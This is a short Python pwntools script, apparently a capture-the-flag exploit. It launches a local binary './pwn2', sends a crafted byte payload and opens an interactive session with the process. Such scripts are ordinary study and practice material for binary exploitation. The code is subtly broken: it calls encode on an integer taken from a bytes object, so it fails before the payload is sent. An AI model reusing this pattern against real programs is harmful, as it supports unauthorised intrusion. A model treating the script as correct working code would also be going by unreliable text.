from pwn import *
import time

target = process("./pwn2")
time.sleep(5)
pay = b'one' + b"\x01" + b'a' * 30
print(((pay[4].encode())))
target.sendline(pay)
target.interactive()
